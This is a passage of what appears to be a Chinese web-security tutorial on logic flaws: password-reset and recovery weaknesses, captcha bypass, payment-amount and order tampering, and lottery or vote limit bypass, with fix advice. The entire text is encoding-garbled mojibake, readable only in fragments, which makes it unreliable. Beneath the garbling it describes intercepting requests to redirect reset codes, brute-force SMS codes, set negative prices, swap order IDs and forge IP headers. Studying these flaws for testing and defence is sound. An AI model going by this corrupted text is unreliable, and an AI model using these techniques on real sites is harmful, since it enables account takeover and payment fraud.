æ˜¯è¿˜å¯ä»¥ä½¿ç”¨ç³»ç»Ÿè‡ªå¸¦çš„å¯†ç æ‰¾å›åŠŸèƒ½è¿›è¡Œå¯†ç ä¿®æ”¹ï¼› ä»€ä¹ˆæ˜¯å¯†ç é‡ç½®æ¼æ´ï¼Ÿ å¯†ç é‡ç½®è¿™ä¸ªåŠŸèƒ½æœ¬èº«æ²¡æœ‰é—®é¢˜ï¼Œä½†å¦‚è¿‡å¯¹å¯†ç é‡ç½®åŠŸèƒ½çš„éªŒè¯æœºåˆ¶ä¸å¤Ÿå®Œå–„å°±å½¢æˆäº†æ¼æ´ï¼› æˆå› ä¸€ã€åŸºäºä¿®æ”¹å¯†ç çš„ å¦‚æœåå°æ²¡æœ‰å¯¹æ—§å¯†ç è¿›è¡ŒéªŒè¯ï¼Œå°±ç›´æ¥è®©è¾“å…¥æ–°å¯†ç  1ã€ç¬¬ä¸€ç§æ–¹å¼ï¼Œå¦‚æœå­˜åœ¨CSRFæ¼æ´ï¼Œæˆ‘ä»¬å°±å¯ä»¥åˆ©ç”¨ä¸€æ³¢; 2ã€å¦‚æœå­˜åœ¨è¶Šæƒæ¼æ´ï¼Œå°±å¯ä»¥ç›´æ¥ä¿®æ”¹å…¶ä»–äººçš„å¯†ç ; 3ã€ç‚¹å‡»ä¿®æ”¹åæŠ“åŒ…æµ‹è¯•ï¼Œè§‚å¯Ÿæ•°æ®åº“åŒ…æœ‰æ²¡æœ‰éªŒè¯ç±»ä¼¼cookieéšæœºæ•°ï¼Œå¦‚æœæ²¡æœ‰çš„è¯ï¼Œå¯ä»¥å°è¯•ä¿®æ”¹ç”¨æˆ·åã€æ‰‹æœºå·æˆ–è€…uidæ¥å°è¯•é‡ç½®å…¶ä»–å¯†ç ; å¦‚æœåå°æ˜¯é€šè¿‡å‘æ³¨å†Œæ‰‹æœºæˆ–è€…æ³¨å†Œé‚®ç®±æ¥é‡ç½®å¯†ç çš„ï¼Œå…³äºéªŒè¯ç çš„æ¼æ´æˆ‘ä»¬éƒ½å¯ä»¥å°è¯•ï¼Œè¿™ç§æ–¹å¼çš„å‰ææ˜¯ä½ å·²ç»é€šè¿‡æŸç§æ–¹å¼è¿›å…¥åˆ°äº†å¯¹æ–¹çš„ä¸ªäººä¸­å¿ƒï¼Œæ‰€ä»¥æ„ä¹‰ä¸å¤ªå¤§. äºŒã€åŸºäºæ‰¾å›å¯†ç çš„ ä¸€èˆ¬æƒ…å†µä¸‹å½“æˆ‘ä»¬ç‚¹å‡»æ‰¾å›å¯†ç çš„æ—¶å€™éƒ½æ˜¯é€šè¿‡éªŒè¯æ‰‹æœºå·æˆ–è€…éªŒè¯é‚®ç®±ï¼Œè¿™å°±åˆå˜æˆäº†éªŒ è¯ç çš„é—®é¢˜; \\1.éªŒè¯ç å‘é€åå‰ç«¯è¿”å› \\2. æœªé™åˆ¶éªŒè¯ç æ¬¡æ•°å¯¼è‡´éªŒè¯ç çˆ†ç ´ \\3. éªŒè¯ç æœ‰è§„å¾‹æˆ–å¯æ§ \\4. éªŒè¯ç è¢«æ”¾åœ¨è¿”å›åŒ…ä¸­ \\5. è¾“å…¥éªŒè¯ç åé€šè¿‡ä¿®æ”¹å“åº”åŒ…çš„çŠ¶æ€æ¥é‡ç½®å¯†ç  \\6. éªŒè¯ç ä¸ºç©ºï¼ˆåŸç†å°±æ˜¯åå°æœªè€ƒè™‘éªŒè¯ç ä¸ºç©ºçš„æƒ…å†µï¼Œç›´æ¥å°±æ˜¯å¦‚æœå­˜åœ¨ï¼Œç„¶åä¸‹é¢ä»… åˆ¤æ–­äº†å­˜åœ¨çš„æƒ…å†µï¼‰ç»•è¿‡æˆ–è€…ä¸‡èƒ½éªŒè¯ç  \\7. æ‹¦æˆªæ•°æ®åŒ…ï¼Œå‘é€éªŒè¯ç æ—¶å¯ä»¥å‘å¤šä¸ªæ‰‹æœºå·å‘é€éªŒè¯ç ï¼Œè¿™ä¸ªæ—¶å€™å°±å¯ä»¥æ·»åŠ ä¸ªäº‘çŸ­ä¿¡ï¼Œç›´æ¥æ¥å—éªŒè¯ç å®Œæˆä¿®æ”¹ç­‰ç­‰ å¯†ç æ‰¾å›æ¼æ´å¯†ç æ‰¾å›æ˜¯å‡ºç°é€»è¾‘æ¼æ´é—®é¢˜æœ€å¤šçš„ä¸€ä¸ªåŠŸèƒ½ï¼Œå› ä¸ºå®ƒçš„äº¤äº’æµç¨‹æœ€å¤šï¼Œç›®å‰æ‰¾å›å¯†ç çš„æ–¹å¼æ¯”è¾ƒå¸¸è§çš„æœ‰é‚®ç®±éªŒè¯ç ã€æ‰‹æœºéªŒè¯ç ä»¥åŠå¯†ä¿é—®é¢˜ï¼Œ 1.è¾“å…¥ç”¨æˆ·åé‚®ç®±æ”¶æœºé˜¶æ®µ äº¤äº’è¿‡ç¨‹ï¼šå³è¾“å…¥è¦é‡ç½®çš„è´¦å·ä¿¡æ¯ï¼Œç‚¹å‡»ç¡®å®šæ—¶ï¼Œå¤§éƒ¨åˆ†åº”ç”¨ä¼šç›´æ¥ä»æ•°æ®åº“ä¸­è¯»å–ç”¨æˆ·é‚®ç®±å’Œæ‰‹æœºä¿¡æ¯ï¼Œå¹¶ä¸”å‘é€éªŒè¯ç ï¼Œè¿˜æœ‰éƒ¨åˆ†ç¨‹åºåœ¨è¾“å…¥ç”¨æˆ·ååï¼Œä¼šæç¤ºä½¿ç”¨æ‰‹æœºè¿˜æ˜¯é‚®ç®±æ‰¾å›å¯†ç ã€‚ åœ¨æäº¤çš„æ—¶å€™å¯ä»¥ç›´æ¥æŠ“åŒ…ä¿®æ”¹æ‰‹æœºæˆ–è€…é‚®ç®±å‚æ•°ï¼Œè¿™æ—¶å¦‚æœåç«¯æ²¡æœ‰åšéªŒè¯ï¼ŒåŸæœ¬å‘é€ç»™è´¦å·Açš„éªŒè¯ç å°±ä¼šå‘é€åˆ°è¢«æˆ‘ä»¬ç¯¡æ”¹çš„æ‰‹æœºæˆ–è€…é‚®ç®±ä¸Šï¼Œåˆ©ç”¨æ¥æ”¶åˆ°çš„éªŒè¯ç å³å¯é‡ç½®å¯†ç ã€‚ 2.å¡«å†™éªŒè¯ç å’Œæ–°å¯†ç é˜¶æ®µ å¡«å†™éªŒè¯ç å’Œæ–°å¯†ç å°±æ„å‘³ç€æˆ‘ä»¬å·²ç»æ‹¿åˆ°äº†éªŒè¯ç æˆ–è€…é‡ç½®å¯†ç çš„URLï¼Œè¿™é‡Œå­˜åœ¨çš„ ä¸»è¦é—®é¢˜æœ‰ï¼š ï¼ˆ1ï¼‰éªŒè¯å‡­è¯è¾ƒç®€å•ï¼Œå¯ä»¥æš´åŠ›ç ´è§£ã€‚ ç›®å‰å¤§å¤šæ•°æ‰‹æœºçŸ­ä¿¡é‡ç½®å¯†ç çš„éªŒè¯ç éƒ½æ˜¯4ä½æˆ–è€…6ä½æ•°å­—ï¼Œå¦‚æœæäº¤éªŒè¯ç çš„åœ°æ–¹æ²¡æœ‰å¯¹è¿™ä¸ªéªŒè¯ç è¿›è¡Œé”™è¯¯æ¬¡æ•°é™åˆ¶ï¼Œåˆ™ä¼šå­˜åœ¨å¯ä»¥çˆ†ç ´çš„é—®é¢˜ï¼Œè¿™æ˜¯ç›®å‰æœ€å¸¸è§çš„ä¸€ç§æ‰¾å›å¯†ç æ¼æ´åˆ©ç”¨æ–¹å¼ã€‚ ï¼ˆ2ï¼‰éªŒè¯å‡­è¯ç®—æ³•ç®€å•ï¼Œå‡­è¯å¯é¢„æµ‹ã€‚ éƒ¨åˆ†ç½‘ç«™æ‰¾å›å¯†ç çš„Tokenæ˜¯æ ¹æ®å½“å‰ç”¨æˆ·çš„â€œç”¨æˆ·å+é‚®ç®±â€æˆ–è€…æ—¶é—´æˆ³è¿›è¡Œä¸€æ¬¡MD5åç”Ÿæˆï¼Œè¿™å°±å­˜åœ¨ä¸€å®šå¾—é¢„æµ‹æ€§ï¼Œåˆ©ç”¨è‡ªå·±å†™çš„ç®—æ³•å»ç¢°æ’å³å¯æ‹¿åˆ°äº‰å–åˆ°çš„é‡ç½®å¯†ç å‡­è¯ã€‚ ï¼ˆ3ï¼‰éªŒè¯å‡­è¯ç›´æ¥ä¿å­˜åœ¨æºç é‡Œã€‚ ç›®å‰è¿™ç§æ¯”è¾ƒå°‘ï¼Œä¸è¿‡ä¹Ÿå­˜åœ¨ä¸€å®šæ¯”ä¾‹ï¼Œä¸€ç§æ˜¯åœ¨ç‚¹å‡»å‘é€éªŒè¯ç çš„æ—¶å€™å°±å¯ä»¥ç›´æ¥åœ¨æºç é‡Œçœ‹åˆ°ç»™å½“å‰ç”¨æ‰‹æœºæˆ–è€…é‚®ç®±å‘é€è¿‡å»çš„éªŒè¯ç ï¼Œè¿˜æœ‰ä¸€ç§æ˜¯åœ¨è¾“å…¥éªŒè¯ç çš„æ—¶å€™ï¼Œ æºç é‡Œé¢å°±ç›´æ¥ä¿å­˜äº†æ­£ç¡®çš„éªŒè¯ç ã€‚ 3.å‘é€æ–°å¯†ç é˜¶æ®µ å‡­è¯æœªç»‘å®šç”¨æˆ·ï¼šæˆ‘ä»¬åœ¨æ‰¾å›å¯†ç çš„æ—¶å€™ï¼Œå‘é€åˆ°é‚®ç®±çš„é“¾æ¥é€šå¸¸æ˜¯å¦‚ä¸‹è¿™ä¸ªæ ·å­ï¼šhttp://www.xxx.com/user.php?m=repwduid=ç”¨æˆ·IDkeyå‡­è¯å¯†é’¥emailé‚®ç®± å½“è¯·æ±‚è¿™ä¸ªé“¾æ¥çš„æ—¶å€™ï¼Œåç«¯ç¨‹åºæ ¹æ®uidå’Œkeyå¯¹åº”ä¸Šäº†ä»è€Œåˆ¤æ–­è¿™ä¸ªæ‰¾å›å¯†ç çš„é“¾æ¥æ˜¯å¦æœ‰æ•ˆï¼Œä½†æ˜¯åœ¨å°†æ–°å¯†ç æäº¤åˆ°æœåŠ¡å™¨çš„æ—¶å€™ï¼ŒæœåŠ¡å™¨ç«¯å¹¶æ²¡æœ‰åˆ¤æ–­å½“å‰è¿™ä¸ªkeyæ˜¯å¦è·Ÿuidæˆ–è€…emailåŒ¹é…ï¼Œè€Œæ˜¯ç›´æ¥ä¿®æ”¹æ‰äº†uidæˆ–è€…emailæŒ‡å®šçš„ç”¨æˆ·å¯†ç ï¼Œè¿™æ ·æˆ‘ä»¬åªè¦æ‹¦æˆªä¿®æ”¹å¯†ç çš„è¯·æ±‚åŒ…ï¼Œå°†é‡Œé¢çš„ç”¨æˆ·å‚æ•°ä¿®æ”¹æˆæˆ‘ä»¬è¦ç¯¡æ”¹å¯†ç çš„ç”¨æˆ·è´¦å·å³å¯ã€‚ ä¿®å¤å»ºè®®1.æ¥æ”¶éªŒè¯ç çš„é‚®ç®±å’Œæ‰‹æœºå·ä¸å¯ç”±ç”¨æˆ·æ§åˆ¶ï¼Œåº”è¯¥ç›´æ¥ä»æ•°æ®åº“ä¸­è¯»å–å‡ºæ¥ã€‚ 2.åŠ å¼ºéªŒè¯å‡­è¯å¤æ‚åº¦ï¼Œé˜²æ­¢è¢«æš´åŠ›ç ´è§£ã€‚ 3.é™åˆ¶éªŒè¯å‡­è¯é”™è¯¯æ¬¡æ•°ï¼Œå•ä¸ªç”¨æˆ·åœ¨åŠä¸ªå°æ—¶å†…éªŒè¯ç é”™è¯¯ä¸‰æ¬¡ï¼ŒåŠå°æ—¶å†…ç¦æ­¢æ‰¾å›å¯†ç ã€‚ 4.éªŒè¯å‡­è¯è®¾ç½®å¤±æ•ˆæ—¶é—´ã€‚ 5.éªŒè¯å‡­è¯ä¸è¦ä¿å­˜åœ¨é¡µé¢ã€‚ 6.è¾“å…¥ç”¨æˆ·é‚®ç®±æˆ–IDã€æ‰‹æœºå·å–éªŒè¯å‡­è¯çš„åœ°æ–¹éœ€è¦è®¾ç½®éªŒè¯ç é˜²æ­¢çŸ­ä¿¡ç‚¸å¼¹å’Œæ‰¹é‡æ‰¾å›ç­‰ã€‚ 7.éªŒè¯å‡­è¯è·Ÿç”¨æˆ·åã€ç”¨æˆ·IDã€ç”¨æˆ·é‚®ç®±ç»‘å®šï¼Œæ‰¾å›å¯†ç æ—¶éªŒè¯å½“å‰å‡­è¯æ˜¯å¦æ˜¯å½“å‰ç”¨æˆ·çš„ã€‚ éªŒè¯ç æ¼æ´æ¼æ´æ¦‚å¿µï¼šéªŒè¯ç æœºåˆ¶ä¸»è¦ç”¨äºç”¨æˆ·èº«ä»½è¯†åˆ«ï¼Œå¸¸è§å¯åˆ†ä¸ºå›¾ç‰‡éªŒè¯ç ã€æ•°å­—éªŒè¯ç ã€æ»‘åŠ¨éªŒè¯ç ã€çŸ­ä¿¡éªŒè¯ç ã€é‚®ç®±éªŒè¯ç ç­‰ï¼› æ¼æ´æˆå› ï¼šæœåŠ¡ç«¯æœªå¯¹éªŒè¯æ—¶é—´ã€æ¬¡æ•°ä½œå‡ºé™åˆ¶ï¼Œå­˜åœ¨çˆ†ç ´çš„å¯èƒ½æ€§ã€‚éªŒè¯ç å¸¸ç”¨åœ¨æ‰¹é‡æ³¨å†Œï¼Œä»»æ„ç”¨æˆ·ç™»å½•åœºæ™¯ã€‚ æ¼æ´åˆ†ç±»ï¼š1ã€å‰ç«¯éªŒè¯ç»•è¿‡ åŸç†ï¼šå‰ç«¯éªŒè¯ç ç»•è¿‡ä¸€èˆ¬æ˜¯å‰ç«¯JavaScriptè„šæœ¬ç”ŸæˆéªŒè¯ç ï¼ŒéªŒè¯çš„å·¥ä½œåœ¨å‰ç«¯è¿›è¡Œï¼› æ€è·¯ï¼šç›´æ¥åˆ é™¤ç›¸å¯¹åº”çš„éƒ¨ä»½çš„ä»£ç å³å¯ï¼Œè¦æ±‚èƒ½å¤Ÿå¤§æ¦‚çœ‹æ‡‚å‰ç«¯çš„ä»£ç ï¼› 2ã€åç«¯éªŒè¯ç æœªåˆ·æ–° åŸç†ï¼šåç«¯ç»•è¿‡æƒ…å†µ1ï¼šåç«¯ä»£ç åœ¨é€»è¾‘ä¸Šå­˜åœ¨é—®é¢˜ï¼ŒéªŒè¯å¤±è´¥æ—¶ï¼ŒéªŒè¯ç ä¸è¿‡æœŸï¼Œå¯ä»¥ç»§ç»­åšè®¤è¯ï¼ˆä¹Ÿç®—ä½œé€»è¾‘æ¼æ´ï¼‰ï¼› æ€è·¯ï¼šè¿™ç±»æƒ…å†µéœ€è¦BurpæŠ“åŒ…æµ‹è¯•éªŒè¯ï¼› å®æˆ˜ï¼šä¸œå¡”æ”»é˜²ä¸–ç•Œ-åç«¯éªŒè¯ç ç»•è¿‡ 3ã€TOKENéªŒè¯å¯æå– æ€è·¯ï¼šåˆ©ç”¨burpå·¥å…·ï¼Œå¯ä»¥æ¯æ¬¡è‡ªåŠ¨æå–åå°è¿”å›çš„tokenå€¼ï¼Œç”¨äºä¸‹ä¸€æ¬¡çš„çˆ†ç ´ä½¿ç”¨ï¼› æ”¯ä»˜æ¼æ´åŸç†æ”¯ä»˜æ¼æ´ï¼Œæ˜¯ä¸€ç§å¾ˆç®€å•çš„é€»è¾‘æ¼æ´ï¼Œé€šè¿‡æŠ“åŒ…ç®€å•ä¿®æ”¹æ•°æ®åŒ…å³å¯å®ç°ã€‚ ä¸–ç•Œä¸Šçš„å…¬å¸åˆ†ä¸ºä¿©ç§ï¼Œä¸€ç§æ˜¯è¿˜æ²¡è¢«é»‘å®¢æ”»å‡»è¿‡çš„ï¼Œå¦ä¸€ç§å°±æ˜¯å·²ç»è¢« é»‘å®¢ æ”»å‡»è¿‡çš„ã€‚ æ‰€ä»¥ä¼ä¸šä¹Ÿè¶Šæ¥è¶Šé‡è§†ç½‘ç»œå®‰å…¨è¿™å—ï¼Œè¿™æ ·çš„æ”¯ä»˜æ¼æ´å°±é‚£ä¹ˆå¥½æ‰¾äº†â€¦â€¦. å•†æˆ·ç½‘ç«™æ¥å…¥æ”¯ä»˜ç»“æœæœ‰ä¸¤ç§æ–¹å¼ï¼Œä¸€ç§æ˜¯é€šè¿‡æµè§ˆå™¨è¿›è¡Œè·³è½¬é€šçŸ¥ï¼Œä¸€ç§æ˜¯æœåŠ¡å™¨ç«¯å¼‚æ­¥é€šçŸ¥ï¼› Ã˜ æµè§ˆå™¨è·³è½¬ åŸºäºç”¨æˆ·è®¿é—®çš„æµè§ˆå™¨ï¼Œå¦‚æœç”¨æˆ·åœ¨é“¶è¡Œé¡µé¢æ”¯ä»˜æˆåŠŸåï¼Œç›´æ¥å…³é—­äº†é¡µé¢ï¼Œå¹¶æœªç­‰å¾…é“¶è¡Œè·³è½¬åˆ°æ”¯ä»˜ç»“æœé¡µé¢ï¼Œé‚£ä¹ˆå•†æˆ·ç½‘ç«™å°±æ”¶ä¸åˆ°æ”¯ä»˜ç»“æœçš„é€šçŸ¥ï¼Œå¯¼è‡´æ”¯ä»˜ç»“æœéš¾ä»¥å¤„ç†ã€‚è€Œä¸”æµè§ˆå™¨ç«¯æ•°æ®å¾ˆå®¹æ˜“è¢«ç¯¡æ”¹è€Œé™ä½å®‰å…¨æ€§ï¼› Ã˜ æœåŠ¡å™¨ç«¯å¼‚æ­¥é€šçŸ¥ è¯¥æ–¹å¼æ˜¯æ”¯ä»˜å…¬å¸æœåŠ¡å™¨åå°ç›´æ¥å‘ç”¨æˆ·æŒ‡å®šçš„å¼‚æ­¥é€šçŸ¥URLå‘é€å‚æ•°ï¼Œé‡‡ç”¨POSTæˆ–GETçš„æ–¹å¼ã€‚å•†æˆ·ç½‘ç«™æ¥æ”¶å¼‚éƒ¨å‚æ•°çš„URLå¯¹åº”çš„ç¨‹åºä¸­ï¼Œè¦å¯¹æ”¯ä»˜å…¬å¸è¿”å›çš„æ”¯ä»˜ç»“æœè¿›è¡Œç­¾åéªŒè¯ï¼ŒæˆåŠŸåè¿›è¡Œæ”¯ä»˜é€»è¾‘å¤„ç†ï¼Œå¦‚éªŒè¯é‡‘é¢ã€è®¢å•ä¿¡æ¯æ˜¯å¦ä¸å‘èµ·æ”¯ä»˜æ—¶ä¸€è‡´ï¼ŒéªŒè¯æ­£å¸¸åˆ™å¯¹è®¢å•è¿›è¡ŒçŠ¶æ€å¤„ç†æˆ–ä¸ºç”¨æˆ·è¿›è¡Œç½‘ç«™å†…å…¥è´¦ç­‰ï¼› åˆ†ç±»1.ä¿®æ”¹æ”¯ä»˜ä»·æ ¼ æ”¯ä»˜ä¸‰æ­¥æ›²â€”â€”è®¢è´­ã€ä¸‹å•ã€ä»˜æ¬¾ â€¢ä¸‰ä¸ªæ­¥éª¤å½“ä¸­çš„éšä¾¿ä¸€ä¸ªæ­¥éª¤è¿›è¡Œä¿®æ”¹ä»·æ ¼æµ‹è¯•ï¼Œå¦‚æœå‰é¢ä¸¤æ­¥æœ‰éªŒè¯æœºåˆ¶ï¼Œé‚£ä¹ˆä½ å¯åœ¨æœ€åä¸€æ­¥ä»˜æ¬¾æ—¶è¿›è¡ŒæŠ“åŒ…å°è¯•ä¿®æ”¹é‡‘é¢ï¼Œå¦‚æœæ²¡æœ‰åœ¨æœ€åä¸€æ­¥åšå¥½æ£€éªŒï¼Œé‚£ä¹ˆé—®é¢˜å°±ä¼šå­˜åœ¨ï¼Œå…¶ä¿®æ”¹çš„é‡‘é¢å€¼ä½ å¯ä»¥å°è¯•å°æ•°ç›®æˆ–è€…å°è¯•è´Ÿæ•°ã€‚ 2.ä¿®æ”¹è®¢å•æ•°é‡ å¾ˆç®€å•ï¼Œå°±æ˜¯æœ¬æ¥ä¸€ç¬”è®¢å•5å—é’±ï¼Œå¯ä»¥å°è¯•æŠŠè®¢å•ä¿®æ”¹ä¸ºè´Ÿæ•° 3.ä¿®æ”¹é™„å±å€¼(ä¼˜æƒ åˆ¸) ä¼˜æƒ åŠµä¸»è¦ç”¨æ¥æ‰“æŠ˜æˆ–è€…æŠµæ‰£ç°é‡‘ï¼Œä¸€èˆ¬ç”¨ä¼˜æƒ åŠµè¿›è¡Œæ¶ˆè´¹ä¸€èˆ¬å‡ºç°åœ¨ç¬¬äºŒä¸ªæ­¥éª¤å½“ä¸­ï¼šç¡®è®¤è´­ä¹°ä¿¡æ¯ï¼Œåœ¨è¿™ä¸ªæ­¥éª¤é¡µé¢å½“ä¸­ï¼Œä½ å¯ä»¥é€‰æ‹©ç›¸å…³ä¼˜æƒ åŠµï¼Œç„¶åç›´æ¥ä¿®æ”¹é‡‘é¢å¤§äºæˆ–ç­‰äºå•†å“çš„ä»·æ ¼å°±å¯ä»¥ï¼Œæˆ–è€…ç›´æ¥ä¿®æ”¹å…¶ä¸ºè´Ÿå€¼è¿›è¡Œå°è¯•ï¼Œæœ€åè¿›è¡Œæ”¯ä»˜ï¼Œå¦‚æœå¯¹è¿™ç‚¹æ²¡æœ‰åŠ ä»¥éªŒè¯ï¼Œé‚£ä¹ˆ é—®é¢˜å°±ä¼šäº§ç”Ÿï¼Œç›´æ¥æ”¯ä»˜æˆåŠŸã€‚ 4.è¶Šæƒæ”¯ä»˜ ä¾‹å¦‚ï¼šusernameXXXXXï¼Œå¦‚æœæ²¡æœ‰åŠ ä»¥éªŒè¯ï¼Œå…¶æ”¯ä»˜ä¹Ÿæ˜¯ä¸€æ¬¡æ€§æ”¯ä»˜æ²¡æœ‰è¦æ±‚è¾“å…¥å¯†ç ä»€ä¹ˆçš„æœºåˆ¶ï¼Œé‚£ä¹ˆå°±å¯ä»¥ä¿®æ”¹è¿™ä¸ªç”¨æˆ·IDä¸ºå…¶å®ƒç”¨æˆ·IDï¼Œè¾¾åˆ°ç”¨å…¶ä»–ç”¨æˆ·çš„è´¦å·è¿›è¡Œæ”¯ä»˜ä½ çš„å•†å“ï¼› 5.æ— é™åˆ¶è¯•ç”¨ åœ¨æ”¯ä»˜çš„æ—¶å€™å®ƒURLåé¢çš„æ”¯ä»˜æ¥å£æ˜¯3ï¼Œè€Œè¯•ç”¨æ¥å£æ˜¯4ï¼Œé‚£ä¹ˆæ­¤æ—¶ä½ å·²ç»ä½¿ç”¨è¿‡äº†ï¼Œå¤åˆ¶ä¸‹ç¡®è®¤è¯•ç”¨æ—¶çš„URLï¼Œä¿®æ”¹åé¢çš„æ”¯ä»˜æ¥å£ä¸º3ï¼Œé‚£ä¹ˆæ­¤æ—¶å°±ä¼šè°ƒç”¨è´­ä¹°æ”¯ä»˜æ¥å£ï¼Œä½†æ˜¯ç”±äºä½ æœ¬èº«è¿™ä¸ªäº§å“å°±æ˜¯è¯•ç”¨çš„ï¼Œå…¶ç›¸åº”å€¼ç»‘å®šäº†è¿™ä¸ªè¯•ç”¨å•†å“ï¼Œé‚£ä¹ˆé‡‘é¢å°±è‚¯å®šæ˜¯0ï¼Œé‚£ä¹ˆæœ€åç‚¹å‡»æ”¯ä»˜ï¼Œä½ å°±å¯ä»¥çœ‹åˆ°æ”¯ä»˜æˆåŠŸï¼Œè¯•ç”¨æˆåŠŸï¼Œåˆé‡å¤è¯•ç”¨äº†ä¸€æ¬¡ï¼Œç„¶åä»–ä»¬çš„è¯•ç”¨æ—¶é—´ä¼šç´¯åŠ åœ¨ä¸€èµ·ï¼Œè¿™å°±å¯¼è‡´äº†å¯æ— é™åˆ¶è´­ä¹°ä»»ä½•äº§å“äº†ã€‚ 6.ä¿®æ”¹æ”¯ä»˜æ¥å£ ä¸€äº›ç½‘ç«™æ”¯æŒå¾ˆå¤šç§æ”¯ä»˜ï¼Œæ¯”å¦‚è‡ªå®¶çš„æ”¯ä»˜å·¥å…·ï¼Œç¬¬ä¸‰æ–¹çš„æ”¯ä»˜å·¥å…·ï¼Œç„¶åæ¯ä¸ªæ”¯ä»˜æ¥å£å€¼ä¸ä¸€æ ·ï¼Œå¦‚æœé€»è¾‘è®¾è®¡ä¸å½“ï¼Œå½“æˆ‘éšä¾¿é€‰æ‹©ä¸€ä¸ªç‚¹å‡»æ”¯ä»˜æ—¶è¿›è¡ŒæŠ“åŒ…ï¼Œç„¶åä¿®æ”¹å…¶æ”¯ä»˜æ¥å£ä¸ºä¸€ä¸ªä¸å­˜åœ¨çš„æ¥å£ï¼Œå¦‚æœæ²¡åšå¥½ä¸å­˜åœ¨æ¥å£ç›¸å…³å¤„ç†ï¼Œé‚£ä¹ˆæ­¤æ—¶å°±ä¼šæ”¯ä»˜æˆåŠŸï¼› 7.å¤šé‡æ›¿æ¢ é¦–å…ˆå»äº§ç”Ÿä¸¤ä¸ªè®¢å•ï¼Œè¿™ä¸¤ä¸ªè®¢å•å•†å“æ˜¯ä¸ä¸€æ ·çš„ï¼Œå…¶ä»·æ ¼ä¸ä¸€æ ·ï¼Œå¦‚æœæœåŠ¡ç«¯æ²¡æœ‰åšå¥½è¿™ç›¸å…³çš„éªŒè¯ï¼Œé‚£ä¹ˆåœ¨æ”¯ä»˜çš„è¿‡ç¨‹å½“ä¸­æŠ“åŒ…ï¼Œä¿®æ”¹å…¶è®¢å•å€¼ä¸ºå¦ä¸€ä¸ªè®¢å•å€¼ï¼Œæœ€åæ”¯ä»˜ï¼Œè¿™æ—¶å°±å¯ä»¥ç”¨è®¢å•ä¸€çš„æ”¯ä»˜ä»·æ ¼ä¹°åˆ°è®¢å•è€Œçš„å•†å“ï¼› é˜²å¾¡Ã˜ åç«¯æ£€æŸ¥æ¯ä¸€é¡¹å€¼ï¼ŒåŒ…æ‹¬æ”¯ä»˜çŠ¶æ€ï¼› Ã˜ æ ¡éªŒä»·æ ¼ã€æ•°é‡å‚æ•°ï¼Œæ¯”å¦‚äº§å“æ•°é‡åªèƒ½ä¸ºæ­£æ•´æ•°ï¼Œå¹¶é™åˆ¶è´­ä¹°æ•°é‡ï¼› Ã˜ ä¸ç¬¬ä¸‰æ–¹æ”¯ä»˜å¹³å°æ£€æŸ¥ï¼Œå®é™…æ”¯ä»˜çš„é‡‘é¢æ˜¯å¦ä¸è®¢å•é‡‘é¢ä¸€è‡´ï¼› Ã˜ æ”¯ä»˜å‚æ•°è¿›è¡ŒMD5 åŠ å¯†ã€è§£å¯†ã€æ•°å­—ç­¾ååŠéªŒè¯ï¼Œè¿™ä¸ªå¯ä»¥æœ‰æ•ˆçš„é¿å…æ•°æ®ä¿®æ”¹ï¼Œé‡æ”¾æ”»å‡»ä¸­çš„å„ç§é—®é¢˜ï¼› Ã˜ é‡‘é¢è¶…è¿‡é˜ˆå€¼ï¼Œè¿›è¡Œäººå·¥å®¡æ ¸ ï¼› æŠ•ç¥¨ç§¯åˆ†æŠ½å¥–æ¼æ´æŠ•ç¥¨å’ŒæŠ½å¥–ä»¥åŠç§¯åˆ†åœ¨å¾ˆå¤šä¿ƒé”€æ´»åŠ¨æˆ–è€…æ¨å¹¿æ‰‹æ®µä¸Šéƒ½ç»å¸¸ç”¨åˆ°ï¼ŒèƒŒåçš„å¥–å“æˆæœ¬å¯èƒ½ä¸Šæ•°åä¸‡ï¼Œå¦‚æœè¿™äº›å¥–å“è¢«æ¶æ„ç”¨æˆ·åˆ·èµ°äº†ï¼Œä¸ä»…æ¨å¹¿çš„æ•ˆæœæ²¡æœ‰ï¼Œè€Œä¸”æµªè´¹äº†æˆæœ¬æŠ•å…¥ã€‚ ä¸ç®¡æ˜¯æŠ•ç¥¨ã€ç§¯åˆ†è¿˜æ˜¯æŠ½å¥–ï¼Œéƒ½å­˜åœ¨ä¸€ä¸ªå…¬å…±ç‚¹ï¼šå³å•ä¸ªç”¨æˆ·æ¬¡æ•°å­˜åœ¨é™åˆ¶ï¼Œæ¯”å¦‚ä¸€åœºæ´»åŠ¨ä¸­ä¸€ä¸ªç”¨æˆ·åªèƒ½æŠ½å¥–ä¸€æ¬¡ã€‚è¿™æ ·çš„é™åˆ¶ä¹Ÿä¼šå­˜åœ¨å¾ˆå¤šç»•è¿‡æ–¹å¼ã€‚ åˆ©ç”¨æ–¹æ³•1.cookieå’ŒPOSTè¯·æ±‚æ­£æ–‡ç»•è¿‡ æœ‰çš„åº”ç”¨å°†éªŒè¯æ˜¯å¦æŠ½å¥–æˆ–è€…é¢†å–ç§¯åˆ†çš„åˆ¤æ–­å€¼æ”¾ç½®åœ¨cookieæˆ–è€…POSTçš„è¯·æ±‚æ­£æ–‡é‡Œï¼ŒæœåŠ¡å™¨ç«¯è·å–åˆ°è¿™ä¸ªç»“æœååˆ¤æ–­æ˜¯å¦è¿˜æœ‰æœºä¼šæŠ½å¥–ï¼Œè€Œè¿™ä¸ªæ•°æ®æˆ‘ä»¬æ˜¯å¯ä»¥ç›´æ¥åœ¨æ•°æ®åŒ…ä¸­ä¿®æ”¹çš„ï¼Œæ‰€ä»¥å°±ä¼šäº§ç”Ÿç»•è¿‡ï¼Œæ¯”å¦‚cookieä¸­isok1ä»£è¡¨å·²ç»æŠ½å¥–ï¼Œisok0ä»£è¡¨è¿˜æ²¡æœ‰æŠ½å¥–ï¼Œ è€Œæˆ‘ä»¬åªè¦å†ç‚¹å‡»æŠ½å¥–ï¼Œç„¶åæŠŠisokçš„å€¼æ”¹ä¸º0å³å¯ä¸€ç›´æŠ½å¥–ã€‚ 2.åŸºäºIPéªŒè¯ åšçš„æ¯”è¾ƒå¼±çš„ç»Ÿè®¡æ˜¯ç›´æ¥åŸºäºIPéªŒè¯ï¼Œåƒè®¿é—®é‡ã€æ¨å¹¿è·å–ç§¯åˆ†ç­‰ï¼Œè¿™ç±»è¦çœ‹ç¨‹åºè·å–IPçš„æ–¹å¼ï¼Œå¦‚æœæ˜¯client-ipæˆ–è€…x_forword_forè·å–IPï¼Œåˆ™å¯ä»¥ç›´æ¥ä¼ªé€ IPç»•è¿‡ã€‚ 3.åŸºäºç”¨æˆ·è®¤è¯ 